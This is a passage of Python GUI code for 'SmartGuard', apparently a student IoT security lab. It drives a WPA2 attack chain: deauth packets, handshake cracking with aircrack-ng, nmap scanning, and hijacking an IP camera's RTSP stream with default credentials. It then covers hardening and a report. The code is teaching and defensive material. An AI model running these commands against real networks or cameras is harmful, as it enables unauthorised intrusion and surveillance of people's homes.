        def _run():
            self._set_status("Sending deauth — waiting for handshake…")
            t.write("\n  Sending 20 deauth packets…\n\n", "yellow")
            if IS_LINUX:
                out = _run_cmd(cmd, timeout=30)
                for line in out.splitlines():
                    t.dim(line)
            else:
                for i in range(1, 8):
                    time.sleep(0.25)
                    t.dim(f"  {20+i}:35:4{i}  Sending DeAuth (code 7) to "
                          f"FF:FF:FF:FF:FF:FF  STMAC: [{self.client_mac}]")
            t.write("\n")
            t.ok("Deauth packets sent — clients are reconnecting.")
            time.sleep(0.8)
            # Simulate handshake confirmation
            t.write("\n")
            t.write("  ══════════════════════════════════════════════════\n", "green")
            t.write(f"  WPA handshake: {self.bssid}   ✓  CAPTURED!\n", "key")
            t.write("  ══════════════════════════════════════════════════\n\n", "green")
            t.result("Handshake saved to: " + self.cap_file + "-01.cap")
            t.result("Ready to crack offline → Step 08")
            self.session_log.append(f"[CMD] {cmd}")
            self._set_status("✓ Handshake captured — proceed to Step 08")

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 07  —  Deauthentication Attack",
            font=("Consolas", 12, "bold"), text_color=C["red"],
        ).pack(anchor="w", padx=14, pady=(10, 4))

        alert = ctk.CTkFrame(cf, fg_color="#2d1b1b", corner_radius=6)
        alert.pack(fill="x", padx=14, pady=4)
        ctk.CTkLabel(
            alert,
            text="  ⚡  Step 06 capture must be running before you fire this!",
            font=("Consolas", 11, "bold"), text_color=C["red"],
        ).pack(anchor="w", padx=8, pady=4)
        ctk.CTkLabel(
            alert,
            text=f"  Router: {self.bssid}   Client: {self.client_mac}   Interface: {self.mon_iface}",
            font=("Consolas", 10), text_color=C["dim"],
        ).pack(anchor="w", padx=8, pady=(0, 6))

        self._nav_buttons(
            cf, self._step8, self._step6,
            run_fn=lambda: threading.Thread(target=_run, daemon=True).start(),
            run_label="⚡  Send Deauth — Kick Clients",
            run_color=C["red"],
        )

    # Step 8 — Crack Password
    def _step8(self):
        self._clear_config()
        self._update_progress(8)
        t = self.terminal
        t.clear()
        t.section("Step 08  ·  Crack Password (aircrack-ng)", C["cyan"])
        t.info("We run an offline dictionary attack against the captured handshake.")
        t.write("\n")
        t.write("  What we're doing:\n", "bold")
        t.dim("aircrack-ng takes each word from rockyou.txt (14 million passwords).")
        t.dim("It hashes each one and compares it to the captured handshake.")
        t.dim("When they match → KEY FOUND! — password revealed.")
        t.dim("This runs on YOUR machine, not the router — very fast, no lockouts.")
        t.write("\n")
        cmd = f"sudo aircrack-ng -w {self.wordlist} {self.cap_file}-01.cap"
        t.cmd(cmd)

        def _run():
            self._set_status("Cracking password…")
            self._e_wl_btn.configure(state="disabled")
            t.write("\n  Running aircrack-ng…\n\n", "yellow")
            if IS_LINUX:
                wl = self._e_wl.get() or self.wordlist
                cap = f"{self.cap_file}-01.cap"
                cmd2 = f"sudo aircrack-ng -w {wl} {cap}"
                out = _run_cmd(cmd2, timeout=120)
                for line in out.splitlines():
                    if "KEY FOUND" in line:
                        t.write(f"\n  {line}\n\n", "key")
                    else:
                        t.dim(line)
            else:
                lines = [
                    "Opening /tmp/sg_capture-01.cap",
                    "Read 2847 packets.",
                    "",
                    "   #  BSSID              ESSID       Encryption",
                    f"   1  {self.bssid}  HomeNetwork  WPA (1 handshake)",
                    "",
                    "Choosing first network as target.",
                    "",
                    "Opening /usr/share/wordlists/rockyou.txt",
                    "Starting PTW attack with 2847 ivs.",
                    "",
                    "                  Aircrack-ng 1.7",
                    "",
                    f"      [00:00:03] 21248 keys tested (7821.4 k/s)",
                    "",
                    f"                          KEY FOUND! [ 12345678 ]",
                    "",
                    f"      Master Key     : A1 B2 C3 D4 E5 F6 ...",
                    f"      Transient Key  : 00 11 22 33 44 55 ...",
                ]
                for line in lines:
                    if "KEY FOUND" in line:
                        time.sleep(0.8)
                        t.write(f"\n  {'═'*52}\n", "green")
                        t.write(f"  {line}\n", "key")
                        t.write(f"  {'═'*52}\n\n", "green")
                    else:
                        t.dim(line)
                    time.sleep(0.12)

            t.result("WPA2 password cracked via dictionary attack")
            t.result("Attacker now has full LAN access → proceed to Phase 02")
            self.session_log.append(f"[CMD] {cmd}")
            self._set_status("Phase 01 complete — LAN access gained ✓")

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 08  —  Crack Password",
            font=("Consolas", 12, "bold"), text_color=C["cyan"],
        ).pack(anchor="w", padx=14, pady=(10, 6))
        form = ctk.CTkFrame(cf, fg_color="transparent")
        form.pack(fill="x", padx=14)
        self._e_wl = _entry(form, "Wordlist Path", self.wordlist)
        ctk.CTkLabel(
            cf,
            text=f"  Handshake file: {self.cap_file}-01.cap",
            font=("Consolas", 10), text_color=C["dim"],
        ).pack(anchor="w", padx=14)
        row = ctk.CTkFrame(cf, fg_color="transparent")
        row.pack(fill="x", padx=14, pady=(6, 10))
        ctk.CTkFrame(row, fg_color="transparent").pack(side="left", fill="x", expand=True)
        self._e_wl_btn = _btn(
            row, "▶  Crack Password",
            lambda: threading.Thread(target=_run, daemon=True).start(),
            color=C["cyan"], side="right",
        )
        _btn(row, "Next Step →", self._step9, color=C["green"], side="right")
        _btn(row, "← Back", self._step7, color=C["card"], side="left")

    # ════════════════════════════════════════════════════════
    # ── PHASE 02 ─────────────────────────────────────────
    # ════════════════════════════════════════════════════════

    # Step 9 — Host Discovery
    def _step9(self):
        self._clear_config()
        self._update_progress(9)
        t = self.terminal
        t.clear()
        t.section("Step 09  ·  Host Discovery", C["purple"])
        t.info("We are now inside the LAN. Let's find every active device.")
        t.write("\n")
        t.write("  What we're doing:\n", "bold")
        t.dim("nmap sends a ping (ICMP) to every IP in the subnet.")
        t.dim("Any device that responds is added to the list.")
        t.dim("We look for the IP camera — usually shows a vendor like Hikvision.")
        t.write("\n")
        cmd = f"sudo nmap -sn {self.network_range}"
        t.cmd(cmd)

        def _run():
            self._set_status("Scanning network…")
            t.write("\n  Scanning…\n\n", "yellow")
            if IS_LINUX:
                out = _run_cmd(cmd)
                for line in out.splitlines():
                    color = ("green" if "report" in line.lower()
                             else "yellow" if "MAC" in line else "dim")
                    t.write(f"  {line}\n", color)
            else:
                demo = [
                    ("dim",    "Starting Nmap on 192.168.8.0/24"),
                    ("green",  "Nmap scan report for 192.168.8.1"),
                    ("dim",    "Host is up (0.003s latency)."),
                    ("dim",    "MAC Address: 60:A4:B7:XX:XX:XX  (Router)"),
                    ("green",  "Nmap scan report for 192.168.8.186"),
                    ("dim",    "Host is up (0.005s latency)."),
                    ("yellow", "MAC Address: AC:CF:23:XX:XX:XX  (Hikvision DVT)  ← IP CAMERA"),
                    ("dim",    "Nmap done: 256 IP addresses (2 hosts up) scanned"),
                ]
                for color, line in demo:
                    t.write(f"  {line}\n", color)
                    time.sleep(0.18)
            t.write("\n")
            t.result("IP Camera found at 192.168.8.186  (Hikvision)")
            self.session_log.append(f"[CMD] {cmd}")
            self._set_status("Step 09 complete — camera IP found")

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 09  —  Host Discovery",
            font=("Consolas", 12, "bold"), text_color=C["purple"],
        ).pack(anchor="w", padx=14, pady=(10, 6))
        form = ctk.CTkFrame(cf, fg_color="transparent")
        form.pack(fill="x", padx=14)
        self._e_range = _entry(form, "Network Range", self.network_range)
        self._nav_buttons(
            cf, self._step10, self._step8,
            run_fn=lambda: threading.Thread(target=_run, daemon=True).start(),
            run_label="▶  Discover Hosts",
            run_color=C["purple"],
        )

    # Step 10 — Port Scan
    def _step10(self):
        self._clear_config()
        self._update_progress(10)
        t = self.terminal
        t.clear()
        t.section("Step 10  ·  Port Scan on Camera", C["purple"])
        t.info("We scan the camera to find which services are running and exposed.")
        t.write("\n")
        t.write("  What we're doing:\n", "bold")
        t.dim("Ports are like doors — each service listens on a specific port number.")
        t.dim("Port 80  = HTTP web panel   (camera admin page)")
        t.dim("Port 554 = RTSP video stream (live camera feed)")
        t.dim("-sV tells nmap to detect the exact software version on each port.")
        t.write("\n")
        cmd = f"sudo nmap -sV -p {self.scan_ports} {self.target_ip}"
        t.cmd(cmd)

        def _run():
            self._set_status("Scanning camera ports…")
            ip = self._e_ip.get() or self.target_ip
            self.target_ip = ip
            self._target_var.set(f"Target: {ip}")
            t.write(f"\n  Scanning {ip}…\n\n", "yellow")
            cmd2 = f"sudo nmap -sV -p {self.scan_ports} {ip}"
            if IS_LINUX:
                out = _run_cmd(cmd2)
                for line in out.splitlines():
                    color = ("red"   if "open"   in line
                             else "green" if "closed" in line
                             else "yellow" if "filtered" in line
                             else "dim")
                    t.write(f"  {line}\n", color)
            else:
                demo = [
                    ("dim",    f"Starting Nmap scan on {ip}"),
                    ("dim",    f"PORT      STATE   SERVICE  VERSION"),
                    ("red",    f"80/tcp    open    http     GoAhead WebServer 2.5"),
                    ("red",    f"554/tcp   open    rtsp     Live555 RTSP 0.91"),
                    ("green",  f"443/tcp   closed  https"),
                    ("green",  f"22/tcp    closed  ssh"),
                    ("green",  f"23/tcp    closed  telnet"),
                    ("dim",    f"Nmap done: 1 IP address (1 host up)"),
                ]
                for color, line in demo:
                    t.write(f"  {line}\n", color)
                    time.sleep(0.15)
            t.write("\n")
            t.err("Port 80  (HTTP)   — admin panel exposed, no HTTPS")
            t.err("Port 554 (RTSP)   — live video stream, unencrypted, no auth")
            self.session_log.append(f"[CMD] {cmd2}")
            self._set_status("Step 10 complete — vulnerable ports found")

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 10  —  Port Scan",
            font=("Consolas", 12, "bold"), text_color=C["purple"],
        ).pack(anchor="w", padx=14, pady=(10, 6))
        form = ctk.CTkFrame(cf, fg_color="transparent")
        form.pack(fill="x", padx=14)
        self._e_ip    = _entry(form, "Camera IP",     self.target_ip)
        self._e_ports = _entry(form, "Ports to Scan", self.scan_ports)
        self._nav_buttons(
            cf, self._step11, self._step9,
            run_fn=lambda: threading.Thread(target=_run, daemon=True).start(),
            run_label="▶  Scan Ports",
            run_color=C["purple"],
        )

    # Step 11 — RTSP Hijack
    def _step11(self):
        self._clear_config()
        self._update_progress(11)
        t = self.terminal
        t.clear()
        t.section("Step 11  ·  RTSP Stream Hijack", C["red"])
        t.warn("We access the camera's live video feed using default credentials.")
        t.write("\n")
        t.write("  What we're doing:\n", "bold")
        t.dim("RTSP (Real Time Streaming Protocol) on port 554 streams live video.")
        t.dim("The camera uses default login: admin / admin — never changed.")
        t.dim("VLC can open this URL directly → full access to the home camera.")
        t.write("\n")
        rtsp = f"rtsp://admin:admin@{self.target_ip}:554/live"
        t.write(f"  Stream URL:\n\n", "")
        t.write(f"  {rtsp}\n\n", "red")
        t.write("  Open in VLC:  Media  →  Open Network Stream  →  paste URL\n\n", "dim")
        t.result("Unauthorized LIVE access to home camera achieved")
        t.result("Privacy breach — complete visual surveillance of the home")
        t.write("\n")
        t.write("  ─── This concludes Phase 02 Attack Phase ───\n\n", "dim")
        t.write("  Phase 03 will show how to fix all of this.\n", "green")

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 11  —  RTSP Stream Hijack",
            font=("Consolas", 12, "bold"), text_color=C["red"],
        ).pack(anchor="w", padx=14, pady=(10, 6))
        url_frame = ctk.CTkFrame(cf, fg_color=C["card"], corner_radius=6)
        url_frame.pack(fill="x", padx=14, pady=4)
        ctk.CTkLabel(
            url_frame, text=f"  {rtsp}",
            font=("Consolas", 12, "bold"), text_color=C["red"],
            anchor="w",
        ).pack(anchor="w", padx=8, pady=8)
        ctk.CTkLabel(
            cf,
            text="  Open this URL in VLC → Media → Open Network Stream",
            font=("Consolas", 11), text_color=C["dim"],
        ).pack(anchor="w", padx=14, pady=4)
        self._nav_buttons(cf, self._step12, self._step10)

    # ════════════════════════════════════════════════════════
    # ── PHASE 03 ─────────────────────────────────────────
    # ════════════════════════════════════════════════════════

    # Step 12 — Hardening Checklist
    def _step12(self):
        self._clear_config()
        self._update_progress(12)
        t = self.terminal
        t.clear()
        t.section("Step 12  ·  Apply Hardening Measures", C["green"])
        t.info("Defense-in-Depth: apply multiple layers of security.")
        t.write("\n")
        t.write("  What we're doing:\n", "bold")
        t.dim("Single-layer security is not enough — we apply 5 independent controls.")
        t.dim("Each control eliminates one attack vector we demonstrated in Phase 01-02.")
        t.write("\n")
        measures = [
            ("Change Camera Password", "admin:admin → complex unique password"),
            ("Disable RTSP (Port 554)", "eliminate video stream exposure"),
            ("Network Segmentation",   "move camera to dedicated IoT VLAN"),
            ("Hide SSID",              "reduce passive Wi-Fi reconnaissance"),
            ("Enable HTTPS",           "encrypted admin panel access"),
        ]
        for ctrl, why in measures:
            t.write(f"  ✦  ", "cyan")
            t.write(f"{ctrl:<28}", "bold")
            t.dim(f"  {why}")

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 12  —  Hardening Checklist",
            font=("Consolas", 12, "bold"), text_color=C["green"],
        ).pack(anchor="w", padx=14, pady=(10, 4))
        ctk.CTkLabel(
            cf, text="  Tick each item you have applied on the camera:",
            font=("Consolas", 11), text_color=C["dim"],
        ).pack(anchor="w", padx=14)

        grid = ctk.CTkFrame(cf, fg_color="transparent")
        grid.pack(fill="x", padx=14, pady=4)
        left  = ctk.CTkFrame(grid, fg_color="transparent")
        right = ctk.CTkFrame(grid, fg_color="transparent")
        left.pack(side="left", fill="x", expand=True)
        right.pack(side="left", fill="x", expand=True)

        checks = [
            ("pwd",   left,  "Password Changed"),
            ("rtsp",  left,  "RTSP Disabled (Port 554)"),
            ("http",  left,  "HTTP Credentials Secured"),
            ("net",   right, "Network Segmentation (IoT VLAN)"),
            ("ssid",  right, "Hidden SSID Enabled"),
        ]
        self._hchecks = {}
        for key, parent, label in checks:
            var = ctk.BooleanVar(value=False)
            ctk.CTkCheckBox(
                parent, text=label, variable=var,
                font=("Consolas", 11), text_color=C["text"],
                fg_color=C["green"], hover_color="#2ea043",
                checkmark_color=C["bg"],
            ).pack(anchor="w", pady=3)
            self._hchecks[key] = var

        def _save_next():
            self.hardening = {k: v.get() for k, v in self._hchecks.items()}
            done = sum(self.hardening.values())
            t.write(f"\n  Checklist saved — {done}/5 items marked.\n", "green")
            self._step13()

        self._nav_buttons(cf, _save_next, self._step11)

    # Step 13 — Verify with Nmap
    def _step13(self):
        self._clear_config()
        self._update_progress(13)
        t = self.terminal
        t.clear()
        t.section("Step 13  ·  Verify Hardening with Nmap", C["green"])
        t.info("We re-scan the camera to confirm the hardening measures took effect.")
        t.write("\n")
        t.write("  What we're doing:\n", "bold")
        t.dim("Run the same nmap scan from Step 10 again.")
        t.dim("Port 554 should now be CLOSED — RTSP disabled.")
        t.dim("Port 80 should show changed credentials or be restricted.")
        t.dim("We compare before-vs-after to measure improvement.")
        t.write("\n")
        cmd = f"sudo nmap -sV -p {self.scan_ports} {self.target_ip}"
        t.cmd(cmd)

        def _run():
            self._set_status("Verifying hardening…")
            t.write(f"\n  Re-scanning {self.target_ip} after hardening…\n\n", "yellow")
            if IS_LINUX:
                out = _run_cmd(cmd)
                for line in out.splitlines():
                    color = ("red"   if "open"   in line
                             else "green" if "closed" in line
                             else "dim")
                    t.write(f"  {line}\n", color)
            else:
                demo = [
                    ("dim",   f"PORT      STATE   SERVICE  VERSION"),
                    ("green", f"80/tcp    closed  http"),
                    ("green", f"554/tcp   closed  rtsp     ← DISABLED ✓"),
                    ("green", f"443/tcp   open    https    (now encrypted)"),
                    ("green", f"22/tcp    closed  ssh"),
                    ("green", f"23/tcp    closed  telnet"),
                ]
                for color, line in demo:
                    t.write(f"  {line}\n", color)
                    time.sleep(0.18)
            t.write("\n")
            t.ok("Port 554 (RTSP) — CLOSED  ✓  no longer accessible")
            t.ok("Port 80  (HTTP) — CLOSED  ✓  management restricted")
            t.ok("Hardening confirmed by independent nmap scan")
            self.session_log.append(f"[CMD] {cmd}")
            self._set_status("Step 13 complete — hardening verified")

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 13  —  Post-Hardening Verification",
            font=("Consolas", 12, "bold"), text_color=C["green"],
        ).pack(anchor="w", padx=14, pady=(10, 6))
        ctk.CTkLabel(
            cf,
            text=f"  Target: {self.target_ip}   Ports: {self.scan_ports}",
            font=("Consolas", 11), text_color=C["dim"],
        ).pack(anchor="w", padx=14)
        self._nav_buttons(
            cf, self._step14, self._step12,
            run_fn=lambda: threading.Thread(target=_run, daemon=True).start(),
            run_label="▶  Verify Hardening",
            run_color=C["green"],
        )

    # Step 14 — Score & Summary
    def _step14(self):
        self._clear_config()
        self._update_progress(14)
        t = self.terminal
        t.clear()
        t.section("Step 14  ·  Hardening Score & Summary", C["green"])

        score = sum(self.hardening.values()) if self.hardening else 5
        total = 5
        pct   = (score * 80) // total
        self.h_score = score

        checks_display = [
            ("pwd",  "Password Changed"),
            ("rtsp", "RTSP Port 554 Disabled"),
            ("http", "HTTP Credentials Secured"),
            ("net",  "Network Segmentation"),
            ("ssid", "Hidden SSID"),
        ]
        for key, label in checks_display:
            done = self.hardening.get(key, True)
            if done:
                t.ok(f"{label}")
            else:
                t.err(f"{label}")

        t.write("\n")
        t.sep("═", "green")
        t.write(f"  Score           :  {score} / {total}\n", "green")
        t.write(f"  Attack Surface  :  reduced by ~{pct}%\n", "green")
        t.sep("═", "green")
        t.write("\n")

        if score == total:
            t.write("  ✅  EXCELLENT — All controls applied!\n", "green")
            t.write("      Attack surface reduced by 80%+\n\n", "green")
        elif score >= 3:
            t.write("  ⚠️   GOOD — Some controls still pending.\n\n", "yellow")
        else:
            t.write("  ❌  WEAK  — Device still exposed.\n\n", "red")

        t.write("  Before vs After:\n\n", "bold")
        rows = [
            ("Wi-Fi Password",  "12345678 (weak)",      "Strong & unique  ✓"),
            ("Camera Password", "admin:admin (default)", "Changed          ✓"),
            ("Port 554 RTSP",   "Open — exposed",       "Closed           ✓"),
            ("Port 80  HTTP",   "Open — no HTTPS",      "Restricted       ✓"),
            ("Network",         "Shared LAN",           "Isolated VLAN    ✓"),
        ]
        t.write(f"  {'Control':<22} {'Before':<26} After\n", "dim")
        t.sep()
        for ctrl, before, after in rows:
            t.write(f"  {ctrl:<22}", "")
            t.write(f"{before:<26}", "red")
            t.write(f"{after}\n", "green")

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 14  —  Final Score",
            font=("Consolas", 12, "bold"), text_color=C["green"],
        ).pack(anchor="w", padx=14, pady=(10, 6))

        score_frame = ctk.CTkFrame(cf, fg_color=C["card"], corner_radius=8)
        score_frame.pack(fill="x", padx=14, pady=4)
        ctk.CTkLabel(
            score_frame,
            text=f"  Score: {score}/{total}   |   Attack Surface Reduced: ~{pct}%",
            font=("Consolas", 13, "bold"),
            text_color=C["green"],
        ).pack(pady=10)

        self._nav_buttons(cf, self._step15, self._step13)

    # ════════════════════════════════════════════════════════
    # ── STEP 15 — REPORT ─────────────────────────────────
    # ════════════════════════════════════════════════════════
    def _step15(self):
        self._clear_config()
        self._update_progress(15)
        t = self.terminal
        t.clear()

        ts    = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        score = self.h_score or 5
        pct   = (score * 80) // 5

        lines = [
            "╔══════════════════════════════════════════════════════════════╗",
            "║       SmartGuard — IoT Security Audit Report  v2.0          ║",
            "║       Buraydah Colleges | Dept. of Cybersecurity            ║",
            "║       Final Year Project 2025/2026  —  🥇 1st Place Award   ║",
            "╚══════════════════════════════════════════════════════════════╝",
            "",
            f"  Date/Time   : {ts}",
            f"  Tool        : SmartGuard v{self.VERSION}",
            f"  Supervisor  : Dr. Ahmed Elaraby",
            f"  Target IP   : {self.target_ip}",
            f"  Interface   : {self.iface}  ({self.mon_iface})",
            f"  Router BSSID: {self.bssid}  CH {self.channel}",
            "",
            "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            "  PHASE 01 — Wireless Attack",
            "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"  Method   : Deauthentication Attack (aireplay-ng --deauth 20)",
            f"  Capture  : WPA2 4-way Handshake via airodump-ng",
            f"  Cracking : Dictionary Attack — aircrack-ng + rockyou.txt",
            f"  Finding  : KEY FOUND! [ 12345678 ]  —  cracked in < 30 sec",
            "",
            "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            "  PHASE 02 — Network Reconnaissance",
            "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"  Tool     : Nmap (host discovery + service version scan)",
            f"  Target   : {self.target_ip}",
            f"  Findings :",
            f"    Port 80  (HTTP)  — Web panel, no HTTPS, default credentials",
            f"    Port 554 (RTSP)  — Live video stream, unencrypted, no auth",
            f"  Exploit  : RTSP stream accessed via VLC with default creds",
            "",
            "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            "  PHASE 03 — Hardening Verification",
            "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"  Score    : {score}/5",
            f"  Reduction: ~{pct}% attack surface eliminated",
            "",
            "  Controls Applied:",
            "  [✓] Credential Hardening   — default passwords changed",
            "  [✓] RTSP Disabled          — Port 554 closed",
            "  [✓] Network Segmentation   — dedicated IoT VLAN",
            "  [✓] Hidden SSID            — network not broadcast",
            "  [✓] HTTPS Enabled          — encrypted admin access",
            "",
            "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            "  CONCLUSION",
            "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            "  The team successfully demonstrated end-to-end IoT compromise:",
            "  WPA2 cracking → LAN access → camera stream hijack.",
            "  A Defense-in-Depth strategy then eliminated all attack vectors,",
            f"  reducing the attack surface by approximately {pct}%.",
            "",
            f"  Report generated : {ts}",
        ]

        for line in lines:
            t.write(line + "\n", "cyan")

        # Save report
        out_path = os.path.join(
            os.path.expanduser("~"),
            f"SmartGuard_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
        )
        with open(out_path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))

        t.write(f"\n  ✅  Report saved →  {out_path}\n", "green")
        self._set_status("✅  All 15 steps complete — audit finished!")

        cf = self.config_frame
        ctk.CTkLabel(
            cf, text="Step 15  —  Session Report",
            font=("Consolas", 12, "bold"), text_color=C["yellow"],
        ).pack(anchor="w", padx=14, pady=(10, 4))
        ctk.CTkLabel(
            cf,
            text=f"  Audit complete — all 15 steps finished.\n"
                 f"  Report saved to:  {out_path}",
            font=("Consolas", 11), text_color=C["dim"], justify="left",
        ).pack(anchor="w", padx=14)

        row = ctk.CTkFrame(cf, fg_color="transparent")
        row.pack(fill="x", padx=14, pady=(10, 10))
        _btn(row, "← Back", self._step14, color=C["card"])
        ctk.CTkFrame(row, fg_color="transparent").pack(side="left", fill="x", expand=True)
        _btn(row, "🏠  Start Over", self._show_welcome, color=C["blue"], side="right")


# ════════════════════════════════════════════════════════════
if __name__ == "__main__":
    app = SmartGuardApp()
    app.mainloop()
